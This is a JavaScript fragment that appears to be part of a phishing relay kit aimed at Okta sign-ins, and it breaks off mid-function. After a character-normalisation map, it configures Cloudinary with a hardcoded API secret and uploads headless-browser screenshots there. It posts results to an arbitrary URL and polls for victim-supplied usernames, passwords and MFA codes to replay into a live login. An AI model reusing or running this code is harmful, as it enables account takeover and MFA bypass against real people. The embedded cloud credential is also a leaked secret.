"ɟ":"j",
"ʄ":"j",
"ǳ":"dz",
"ǆ":"dz",
"é":"e",
"ĕ":"e",
"ě":"e",
"ȩ":"e",
"ḝ":"e",
"ê":"e",
"ế":"e",
"ệ":"e",
"ề":"e",
"ể":"e",
"ễ":"e",
"ḙ":"e",
"ë":"e",
"ė":"e",
"ẹ":"e",
"ȅ":"e",
"è":"e",
"ẻ":"e",
"ȇ":"e",
"ē":"e",
"ḗ":"e",
"ḕ":"e",
"ⱸ":"e",
"ę":"e",
"ᶒ":"e",
"ɇ":"e",
"ẽ":"e",
"ḛ":"e",
"ꝫ":"et",
"ḟ":"f",
"ƒ":"f",
"ᵮ":"f",
"ᶂ":"f",
"ǵ":"g",
"ğ":"g",
"ǧ":"g",
"ģ":"g",
"ĝ":"g",
"ġ":"g",
"ɠ":"g",
"ḡ":"g",
"ᶃ":"g",
"ǥ":"g",
"ḫ":"h",
"ȟ":"h",
"ḩ":"h",
"ĥ":"h",
"ⱨ":"h",
"ḧ":"h",
"ḣ":"h",
"ḥ":"h",
"ɦ":"h",
"ẖ":"h",
"ħ":"h",
"ƕ":"hv",
"í":"i",
"ĭ":"i",
"ǐ":"i",
"î":"i",
"ï":"i",
"ḯ":"i",
"ị":"i",
"ȉ":"i",
"Ί":"i",
"ì":"i",
"ỉ":"i",
"ȋ":"i",
"ī":"i",
"į":"i",
"ᶖ":"i",
"ɨ":"i",
"ĩ":"i",
"ḭ":"i",
"ꝺ":"d",
"ꝼ":"f",
"ᵹ":"g",
"ꞃ":"r",
"ꞅ":"s",
"ꞇ":"t",
"ꝭ":"is",
"ǰ":"j",
"ĵ":"j",
"ʝ":"j",
"ɉ":"j",
"ḱ":"k",
"ǩ":"k",
"ķ":"k",
"ⱪ":"k",
"ꝃ":"k",
"ḳ":"k",
"ƙ":"k",
"ḵ":"k",
"ᶄ":"k",
"ꝁ":"k",
"ꝅ":"k",
"ĺ":"l",
"ƚ":"l",
"ɬ":"l",
"ľ":"l",
"ļ":"l",
"ḽ":"l",
"ȴ":"l",
"ḷ":"l",
"ḹ":"l",
"ⱡ":"l",
"ꝉ":"l",
"ḻ":"l",
"ŀ":"l",
"ɫ":"l",
"ᶅ":"l",
"ɭ":"l",
"ł":"l",
"ǉ":"lj",
"ſ":"s",
"ẜ":"s",
"ẛ":"s",
"ẝ":"s",
"ḿ":"m",
"ṁ":"m",
"ṃ":"m",
"ɱ":"m",
"ᵯ":"m",
"ᶆ":"m",
"ń":"n",
"ň":"n",
"ņ":"n",
"ṋ":"n",
"ȵ":"n",
"ṅ":"n",
"ṇ":"n",
"ǹ":"n",
"ɲ":"n",
"ṉ":"n",
"ƞ":"n",
"ᵰ":"n",
"ᶇ":"n",
"ɳ":"n",
"ñ":"n",
"ǌ":"nj",
"ó":"o",
"ŏ":"o",
"ǒ":"o",
"ô":"o",
"ố":"o",
"ộ":"o",
"ồ":"o",
"ổ":"o",
"ỗ":"o",
"ö":"o",
"ȫ":"o",
"ȯ":"o",
"ȱ":"o",
"ọ":"o",
"ő":"o",
"ȍ":"o",
"ò":"o",
"ỏ":"o",
"ơ":"o",
"ớ":"o",
"ợ":"o",
"ờ":"o",
"ở":"o",
"ỡ":"o",
"ȏ":"o",
"ꝋ":"o",
"ꝍ":"o",
"ⱺ":"o",
"ō":"o",
"ṓ":"o",
"ṑ":"o",
"ǫ":"o",
"ǭ":"o",
"ø":"o",
"ǿ":"o",
"õ":"o",
"ṍ":"o",
"ṏ":"o",
"ȭ":"o",
"ƣ":"oi",
"ꝏ":"oo",
"ɛ":"e",
"ᶓ":"e",
"ɔ":"o",
"ᶗ":"o",
"ȣ":"ou",
"ṕ":"p",
"ṗ":"p",
"ꝓ":"p",
"ƥ":"p",
"ᵱ":"p",
"ᶈ":"p",
"ꝕ":"p",
"ᵽ":"p",
"ꝑ":"p",
"ꝙ":"q",
"ʠ":"q",
"ɋ":"q",
"ꝗ":"q",
"ŕ":"r",
"ř":"r",
"ŗ":"r",
"ṙ":"r",
"ṛ":"r",
"ṝ":"r",
"ȑ":"r",
"ɾ":"r",
"ᵳ":"r",
"ȓ":"r",
"ṟ":"r",
"ɼ":"r",
"ᵲ":"r",
"ᶉ":"r",
"ɍ":"r",
"ɽ":"r",
"ↄ":"c",
"ꜿ":"c",
"ɘ":"e",
"ɿ":"r",
"ś":"s",
"ṥ":"s",
"š":"s",
"ṧ":"s",
"ş":"s",
"ŝ":"s",
"ș":"s",
"ṡ":"s",
"ṣ":"s",
"ṩ":"s",
"ʂ":"s",
"ᵴ":"s",
"ᶊ":"s",
"ȿ":"s",
"ɡ":"g",
"ᴑ":"o",
"ᴓ":"o",
"ᴝ":"u",
"ť":"t",
"ţ":"t",
"ṱ":"t",
"ț":"t",
"ȶ":"t",
"ẗ":"t",
"ⱦ":"t",
"ṫ":"t",
"ṭ":"t",
"ƭ":"t",
"ṯ":"t",
"ᵵ":"t",
"ƫ":"t",
"ʈ":"t",
"ŧ":"t",
"ᵺ":"th",
"ɐ":"a",
"ᴂ":"ae",
"ǝ":"e",
"ᵷ":"g",
"ɥ":"h",
"ʮ":"h",
"ʯ":"h",
"ᴉ":"i",
"ʞ":"k",
"ꞁ":"l",
"ɯ":"m",
"ɰ":"m",
"ᴔ":"oe",
"ɹ":"r",
"ɻ":"r",
"ɺ":"r",
"ⱹ":"r",
"ʇ":"t",
"ʌ":"v",
"ʍ":"w",
"ʎ":"y",
"ꜩ":"tz",
"ú":"u",
"ŭ":"u",
"ǔ":"u",
"û":"u",
"ṷ":"u",
"ü":"u",
"ǘ":"u",
"ǚ":"u",
"ǜ":"u",
"ǖ":"u",
"ṳ":"u",
"ụ":"u",
"ű":"u",
"ȕ":"u",
"ù":"u",
"ủ":"u",
"ư":"u",
"ứ":"u",
"ự":"u",
"ừ":"u",
"ử":"u",
"ữ":"u",
"ȗ":"u",
"ū":"u",
"ṻ":"u",
"ų":"u",
"ᶙ":"u",
"ů":"u",
"ũ":"u",
"ṹ":"u",
"ṵ":"u",
"ᵫ":"ue",
"ꝸ":"um",
"ⱴ":"v",
"ꝟ":"v",
"ṿ":"v",
"ʋ":"v",
"ᶌ":"v",
"ⱱ":"v",
"ṽ":"v",
"ꝡ":"vy",
"ẃ":"w",
"ŵ":"w",
"ẅ":"w",
"ẇ":"w",
"ẉ":"w",
"ẁ":"w",
"ⱳ":"w",
"ẘ":"w",
"ẍ":"x",
"ẋ":"x",
"ᶍ":"x",
"ý":"y",
"ŷ":"y",
"ÿ":"y",
"ẏ":"y",
"ỵ":"y",
"ỳ":"y",
"ƴ":"y",
"ỷ":"y",
"ỿ":"y",
"ȳ":"y",
"ẙ":"y",
"ɏ":"y",
"ỹ":"y",
"ύ":"υ",
"ϋ":"υ",
"ΰ":"υ",
"ź":"z",
"ž":"z",
"ẑ":"z",
"ʑ":"z",
"ⱬ":"z",
"ż":"z",
"ẓ":"z",
"ȥ":"z",
"ẕ":"z",
"ᵶ":"z",
"ᶎ":"z",
"ʐ":"z",
"ƶ":"z",
"ɀ":"z",
"ﬀ":"ff",
"ﬃ":"ffi",
"ﬄ":"ffl",
"ﬁ":"fi",
"ﬂ":"fl",
"ĳ":"ij",
"œ":"oe",
"ﬆ":"st",
"ₐ":"a",
"ₑ":"e",
"ᵢ":"i",
"ⱼ":"j",
"ₒ":"o",
"ᵣ":"r",
"ᵤ":"u",
"ᵥ":"v",
"ₓ":"x",
"ή":"η",
"ί":"ι",
"ϊ":"ι",
"ΐ":"ι",
"Ώ":"Ω"

};
String.prototype.latinise=function(){return this.replace(/[^A-Za-z0-9\[\] ]/g,function(a){return Latinise.latin_map[a]||a})};
String.prototype.latinize=String.prototype.latinise;
String.prototype.isLatin=function(){return this==this.latinise()}
 var str2 ="'Ϋ','Æ','Ø','æ','ø', 'ù', 'ú', 'û', 'ü', 'ý', 'ÿ', 'Ā', 'ā', 'Ă', 'ă', 'Ą', 'ą', 'Ć', 'ć', 'Ĉ', 'ĉ', 'Ċ', 'ċ', 'Č', 'č', 'Ď', 'ď', 'Đ', 'đ', 'Ē', 'ē', 'Ĕ', 'ĕ', 'Ė', 'ė', 'Ę', 'ę', 'Ě', 'ě', 'Ĝ', 'ĝ', 'Ğ', 'ğ', 'Ġ', 'ġ', 'Ģ', 'ģ', 'Ĥ', 'ĥ', 'Ħ', 'ħ', 'Ĩ', 'ĩ', 'Ī', 'ī', 'Ĭ', 'ĭ', 'Į', 'į', 'İ', 'ı', 'Ĳ', 'ĳ', 'Ĵ', 'ĵ', 'Ķ', 'ķ', 'Ĺ', 'ĺ', 'Ļ', 'ļ', 'Ľ', 'ľ', 'Ŀ', 'ŀ', 'Ł', 'ł', 'Ń', 'ń', 'Ņ', 'ņ', 'Ň', 'ň', 'ŉ', 'Ō', 'ō', 'Ŏ', 'ŏ', 'Ő', 'ő', 'Œ', 'œ', 'Ŕ', 'ŕ', 'Ŗ', 'ŗ', 'Ř', 'ř', 'Ś', 'ś', 'Ŝ', 'ŝ', 'Ş', 'ş', 'Š', 'š', 'Ţ', 'ţ', 'Ť', 'ť', 'Ŧ', 'ŧ', 'Ũ', 'ũ', 'Ū', 'ū', 'Ŭ', 'ŭ', 'Ů', 'ů', 'Ű', 'ű', 'Ų', 'ų', 'Ŵ', 'ŵ', 'Ŷ', 'ŷ', 'Ÿ', 'Ź', 'ź', 'Ż', 'ż', 'Ž', 'ž', 'ſ', 'ƒ', 'Ơ', 'ơ', 'Ư', 'ư', 'Ǎ', 'ǎ', 'Ǐ', 'ǐ', 'Ǒ', 'ǒ', 'Ǔ', 'ǔ', 'Ǖ', 'ǖ', 'Ǘ', 'ǘ', 'Ǚ', 'ǚ', 'Ǜ', 'ǜ', 'Ǻ', 'ǻ', 'Ǽ', 'ǽ', 'Ǿ', 'ǿ', 'Ά', 'ά', 'Έ', 'έ', 'Ό', 'ό', 'Ώ', 'ώ', 'Ί', 'ί', 'ϊ', 'ΐ', 'Ύ', 'ύ', 'ϋ', 'ΰ', 'Ή', 'ή'";

                console.log(str2.latinize()); // Text with a a e u i o n






  
}
// curl https://api.cloudinary.com/v1_1/demo/image/upload -X POST --data 'file=https://upload.wikimedia.org/wikipedia/commons/a/ae/Olympic_flag.jpg&public_id=olympic_flag&timestamp=12345678&api_key=98765432&signature=a123456f987664af'
var isFirstDebug = true;

const cloudinary = require('cloudinary').v2;
cloudinary.config({ 
   cloud_name: 'dfx4duiqw', 
   api_key: '134661531787314', 
   api_secret: 'JXovOTzvn1Yahpev0G7kTvXhZBk',
   secure: true
});

async function debug(page,i,random,pid,Debug,async=true,fullPage=false){
if (isdebug && page && Debug && Debug=='true') {

     console.log('function debug');
    try{
        let screenshot = await page.screenshot({fullPage:fullPage,encoding: 'base64'});
//async=true;
 
//var newPhoto = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==";
    
if (isFirstDebug) {
cloudinary.api.delete_resources_by_prefix('Screenshot/', function(error,result){console.log(result);});//Source: https://cloudinary.com/documentation/admin_api#delete_resources
isFirstDebug=false; 
}    
    
    
if(random && random!==''){
        var ts = '('+ random +')';
    }else{
        var ts = '';
    }
    console.time('debug'+i+' '+ts);    
//const cloudinary = require('cloudinary').v2;
    
//console.time('screenshot.');

//const screenshot = await page.screenshot({encoding: 'base64'});
//console.timeEnd('screenshot.');
console.time('upload screenshot'+i+' '+ts);
var screenshotb64='data:image/png;base64,'+screenshot;
await cloudinary.uploader.upload(screenshotb64,{folder:"Screenshot",async:async,public_id:pid+''+i+''+ts/*width: 150,crop:"scale",*/},function(error,result){console.log(result);console.log('https://res.cloudinary.com/dfx4duiqw/image/upload/Screenshot/'+pid+''+i+''+ts+'.png');});
/*
function uploadToCloudinary(image) {
  return new Promise((resolve, reject) => {
    cloudinary.v2.uploader.upload(image, (err, url) => {
      if (err) return reject(err);
      return resolve(url);
    })
  });
}
*/


console.timeEnd('upload screenshot'+i+' '+ts);
console.timeEnd('debug'+i+' '+ts);
}catch(ee){console.log('catch cloudinary function error:',ee);}
}else{console.log('!!function debug');}
} 

async function save2url(url,GetOrPost,bodyData,isLoop=false,run=false){
if(!run){
return false;    
}
if(!isLoop || isLoop<2){
isLoop = 1;    
}   
    
i=0;
var okf = false;
console.time('whileEnd('+RandArr[6]+')');
while(!okf && i<isLoop){

console.log('waitForTimeout(i:'+i+'): '+500*i+'ms');    
await page.waitForTimeout(500*i);
i++;    
    
try{


const res2save1 = await fetch(`${url}`, {cache: "no-cache",   method: GetOrPost,
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: bodyData}).then(function(response) { return response.text(); }).catch(error => {console.log('Error::', error);return false;});
    if (res2save1){console.log('results sent to user.......');var senttouser=true;okf=true;};
console.log('res2save1...:',await res2save1);   
}catch(ee){
console.log(ee);
}

console.timeEnd('while i='+i+'('+RandArr[7]+')');

}

}

async function waitForOTP(Id,EmAiL,MoDe,TyPe,BeGiNtImE=Date.now(),TiMeOuT=120000,WaItTiMe=1000,page,TimeoutSelector){
//let TyPe = 'email';
let i=0;
let StOp = false;
//console.time('while('+RandArr[10]+')');
//let NoW = Date.now();
let MfAcOdE = false;
//&&new Date().getTime() < BeginTime.getTime()+limiteTime
//if(MoDe!=="login"){
ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['action'] = 'Waiting';
ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['time'] = Date.now();
//}
while(!StOp&&Date.now()<BeGiNtImE + TiMeOuT){//&&i<30
console.log('waiting.'); 
await page.waitForTimeout(WaItTiMe*2);
i++;
//function sleep(){console.log('exucute sleep');}
//await setTimeout(sleep, 2000);
//setTimeout(() => {console.log("sleep 1500ms");}, 1500);

try{if (ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['code'] !== false){console.log(TyPe+' Code : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["mfa"]["'+TyPe+'"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['code']));}}catch(ee){console.log('err:'+ee);console.log('++ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["mfa"]["'+TyPe+'"]+++');}

//console.log("ResultByIds:++",JSON.stringify(ResultByIds,null,2));
if(typeof ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['code'] !== 'undefined'&& ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['code'] !== false&&typeof ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['time']!== 'undefined'&&BeGiNtImE<ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['time']){
     //,"Time":new Date().toUTCString()
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
        console.log('2fa : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["mfa"]["'+TyPe+'"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]));
       //ResultByIds[Id]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
        MfAcOdE = ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['code'];
        ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['code']=false;
        ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']=false;
        ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']=false;
        ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['time']=false;
        console.log('MfaCode => ResultByIds:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]));
        console.log('MfaCode:'+MfAcOdE);
        StOp = true;
        console.log('StOp = true...');
        console.log('finished...');
    }

if(TimeoutSelector&&await page.$(TimeoutSelector) !== null){console.log('SeLeCtOr => while() break');break;}

}
if(!StOp){
console.log('wait for otp timeout');
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['code']=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='UserNotFound';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['time']=false;
}else{
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['code']=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['time']=false;

ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['action'] = 'Completed';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['time'] = Date.now();

};
//console.timeEnd('while('+RandArr[10]+')');
return MfAcOdE;
}



async function waitForUSER(Id,EmAiL,MoDe,TyPe,BeGiNtImE=Date.now(),TiMeOuT=120000,WaItTiMe=1000,page,TimeoutSelector){
//let TyPe = 'email';
let i=0;
let StOp = false;
let OktaUSER = false;
//&&new Date().getTime() < BeginTime.getTime()+limiteTime
console.log('date now: '+Date.now()+' | BeGiNtImE: '+BeGiNtImE +' | TiMeOuT: '+TiMeOuT);
while(!StOp&&Date.now()< (BeGiNtImE + TiMeOuT)){//&&i<30      //Date.now()< BeGiNtImE + TiMeOuT
console.log('waiting..'); 
await page.waitForTimeout(WaItTiMe*2);
i++;

//function sleep(){console.log('exucute sleep');}
//await setTimeout(sleep, 2000);

//setTimeout(() => {console.log("sleep 1500ms");}, 1500);

try{if (ResultByIds[Id][EmAiL][MoDe]['user']['username'] !== false){console.log('username : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["user"]["username"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['user']['username']));}}catch(ee){console.log('err:'+ee);console.log('+++ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["user"]+++');}
      
//console.log("ResultByIds:++",JSON.stringify(ResultByIds,null,2));
if(typeof ResultByIds[Id][EmAiL][MoDe]['user']['username'] !== 'undefined'&& ResultByIds[Id][EmAiL][MoDe]['user']['username'] !== false&&typeof ResultByIds[Id][EmAiL][MoDe]['user']['time']!== 'undefined'&&ResultByIds[Id][EmAiL][MoDe]['user']['time']!== false&&BeGiNtImE<ResultByIds[Id][EmAiL][MoDe]['user']['time']){
     //,"Time":new Date().toUTCString()
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
        console.log('user : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["user"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['user']));
       //ResultByIds[Id]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
        OktaUSER = ResultByIds[Id][EmAiL][MoDe]['user']['username'];
        ResultByIds[Id][EmAiL][MoDe]['user']['username']=false;
        ResultByIds[Id][EmAiL][MoDe]['user']['retry']=true;
        ResultByIds[Id][EmAiL][MoDe]['user']['result']="FoundUser";
        //ResultByIds[Id][EmAiL][MoDe]['user']['time']=false;
        console.log('OktaUSER => ResultByIds:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['user']));
        console.log('OktaUSER:'+OktaUSER);
        StOp = true;
        console.log('StOp = true....');
        console.log('finished....');
    }

if(TimeoutSelector&&await page.$(TimeoutSelector) !== null){console.log('TimeoutSelector => while() break');break;}

}
if(!StOp){
console.log('wait for username timeout');
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='CodeNotFound';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
}else{
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe][MfAcOdE]=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
};
//console.timeEnd('while('+RandArr[10]+')');
return OktaUSER;
}


async function waitForLOGIN(Id,EmAiL,MoDe,TyPe,BeGiNtImE=Date.now(),TiMeOuT=120000,WaItTiMe=1000,page,TimeoutSelector){
//let TyPe = 'email';
let i=0;
let StOp = false;
let OktaLOGIN = Array();
//&&new Date().getTime() < BeginTime.getTime()+limiteTime
console.log('date now: '+Date.now()+' | BeGiNtImE: '+BeGiNtImE +' | TiMeOuT: '+TiMeOuT);
while(!StOp&&Date.now()< (BeGiNtImE + TiMeOuT)){//&&i<30      //Date.now()< BeGiNtImE + TiMeOuT
console.log('waiting...'); 
await page.waitForTimeout(WaItTiMe*2);
i++;

//function sleep(){console.log('exucute sleep');}
//await setTimeout(sleep, 2000);

//setTimeout(() => {console.log("sleep 1500ms");}, 1500);

try{if (ResultByIds[Id][EmAiL][MoDe]['login']['user'] !== false&&ResultByIds[Id][EmAiL][MoDe]['login']['pass'] !== false){console.log('login : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["login"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['login']));}}catch(ee){console.log('err:'+ee);console.log('+++ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["login"]+++');}
      
//console.log("ResultByIds:++",JSON.stringify(ResultByIds,null,2));
if(typeof ResultByIds[Id][EmAiL][MoDe]['login']['user'] !== 'undefined'&& ResultByIds[Id][EmAiL][MoDe]['login']['user'] !== false&&typeof ResultByIds[Id][EmAiL][MoDe]['login']['pass'] !== 'undefined'&& ResultByIds[Id][EmAiL][MoDe]['login']['pass'] !== false&&typeof ResultByIds[Id][EmAiL][MoDe]['login']['time']!== 'undefined'&&ResultByIds[Id][EmAiL][MoDe]['login']['time']!== false&&BeGiNtImE<ResultByIds[Id][EmAiL][MoDe]['login']['time']){
     //,"Time":new Date().toUTCString()
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
        console.log('login : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["login"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['login']));
       //ResultByIds[Id]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
        OktaLOGIN['user'] = ResultByIds[Id][EmAiL][MoDe]['login']['user'];
        OktaLOGIN['pass'] = ResultByIds[Id][EmAiL][MoDe]['login']['pass'];
        ResultByIds[Id][EmAiL][MoDe]['login']['user']=false;
        ResultByIds[Id][EmAiL][MoDe]['login']['retry']=true;
        ResultByIds[Id][EmAiL][MoDe]['login']['result']="FoundLogin";
        //ResultByIds[Id][EmAiL][MoDe]['user']['time']=false;
        console.log('OktaLOGIN => ResultByIds:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['login']));
        console.log('OktaLOGIN:'+OktaLOGIN);
        StOp = true;
        console.log('StOp = true....');
        console.log('finished....');
    }

if(TimeoutSelector&&await page.$(TimeoutSelector) !== null){console.log('TimeoutSelector => while() break');break;}

}
if(!StOp){
console.log('wait for login timeout');
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='CodeNotFound';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
}else{
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe][MfAcOdE]=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
};
//console.timeEnd('while('+RandArr[10]+')');
return OktaLOGIN;
}

async function waitForAUTH(Id,EmAiL,MoDe,TyPe,BeGiNtImE=Date.now(),TiMeOuT=120000,WaItTiMe=1000,page,TimeoutSelector){
//let TyPe = 'email';
let nmr = '1';
let i=0;
let StOp = false;
let OktaAUTH = false;
//&&new Date().getTime() < BeginTime.getTime()+limiteTime
console.log('date now: '+Date.now()+' | BeGiNtImE: '+BeGiNtImE +' | TiMeOuT: '+TiMeOuT);
while(!StOp&&Date.now()< (BeGiNtImE + TiMeOuT)){//&&i<30      //Date.now()< BeGiNtImE + TiMeOuT
console.log('waiting....'); 
await page.waitForTimeout(WaItTiMe*2);
i++;

//function sleep(){console.log('exucute sleep');}
//await setTimeout(sleep, 2000);

//setTimeout(() => {console.log("sleep 1500ms");}, 1500);

try{if (ResultByIds[Id][EmAiL][MoDe]['auth'][nmr] !== false){console.log('OktaAuth : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["auth"]["'+nmr+'"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['auth'][nmr]));}}catch(ee){console.log('err:'+ee);console.log('+++ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["auth"]+++');}
      
//console.log("ResultByIds:++",JSON.stringify(ResultByIds,null,2));
if(typeof ResultByIds[Id][EmAiL][MoDe]['auth'][nmr] !== 'undefined'&& ResultByIds[Id][EmAiL][MoDe]['auth'][nmr] !== false&&typeof ResultByIds[Id][EmAiL][MoDe]['auth']['time']!== 'undefined'&&ResultByIds[Id][EmAiL][MoDe]['auth']['time']!== false&&BeGiNtImE<ResultByIds[Id][EmAiL][MoDe]['auth']['time']){
     //,"Time":new Date().toUTCString()
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
        console.log('OktaAUTH : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["auth"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['auth']));
       //ResultByIds[Id]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
        OktaAUTH = ResultByIds[Id][EmAiL][MoDe]['auth'][nmr];
        ResultByIds[Id][EmAiL][MoDe]['auth'][nmr]=false;
        //ResultByIds[Id][EmAiL][MoDe]['auth']['time']=false;
        console.log('OktaAUTH => ResultByIds:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['auth']));
        console.log('OktaAUTH:'+OktaAUTH);
        StOp = true;
        console.log('StOp = true....');
        console.log('finished....');
    }

if(TimeoutSelector&&await page.$(TimeoutSelector) !== null){console.log('TimeoutSelector => while() break');break;}

}
if(!StOp){
console.log('wait for auth timeout');
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='CodeNotFound';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
}else{
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe][MfAcOdE]=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
};
//console.timeEnd('while('+RandArr[10]+')');
return OktaAUTH;
}


async function waitForSelectedAUTH(Id,EmAiL,MoDe,TyPe,BeGiNtImE=Date.now(),TiMeOuT=120000,WaItTiMe=1000,page,TimeoutSelector){
let i=0;
let StOp = false;
let SelectedAUTH = false;
//&&new Date().getTime() < BeginTime.getTime()+limiteTime
console.log('date now: '+Date.now()+' | BeGiNtImE: '+BeGiNtImE +' | TiMeOuT: '+TiMeOuT);

ResultByIds[Id][EmAiL][MoDe]['auth']['action'] = 'Waiting';
ResultByIds[Id][EmAiL][MoDe]['auth']['time'] = Date.now();
while(!StOp&&Date.now()< (BeGiNtImE + TiMeOuT)){//&&i<30      //Date.now()< BeGiNtImE + TiMeOuT
console.log('waiting.....'); 
await page.waitForTimeout(WaItTiMe*2);
i++;

//function sleep(){console.log('exucute sleep');}
//await setTimeout(sleep, 2000);

//setTimeout(() => {console.log("sleep 1500ms");}, 1500);

try{if (ResultByIds[Id][EmAiL][MoDe]['auth']['type'] !== false){console.log('SelectedAUTH : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["auth"]["type"]:'+ResultByIds[Id][EmAiL][MoDe]['auth']['type']);}}catch(ee){console.log('err:'+ee);console.log('+++ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["auth"]+++');}
      
//console.log("ResultByIds:++",JSON.stringify(ResultByIds,null,2));
if(typeof ResultByIds[Id][EmAiL][MoDe]['auth']['type'] !== 'undefined'&& ResultByIds[Id][EmAiL][MoDe]['auth']['type'] !== false&&typeof ResultByIds[Id][EmAiL][MoDe]['auth']['time']!== 'undefined'&&ResultByIds[Id][EmAiL][MoDe]['auth']['time']!== false&&BeGiNtImE<ResultByIds[Id][EmAiL][MoDe]['auth']['time']){
     //,"Time":new Date().toUTCString()
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
        console.log('SelectedAUTH : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["auth"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['auth']));
       //ResultByIds[Id]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
        SelectedAUTH = ResultByIds[Id][EmAiL][MoDe]['auth']['type'];
        ResultByIds[Id][EmAiL][MoDe]['auth']['type']=false;
        //ResultByIds[Id][EmAiL][MoDe]['auth']['time']=false;
        console.log('SelectedAUTH => ResultByIds:'+ResultByIds[Id][EmAiL][MoDe]['auth']['type']);
        console.log('SelectedAUTH:'+SelectedAUTH);
        StOp = true;
        console.log('StOp = true....');
        console.log('finished....');
    }

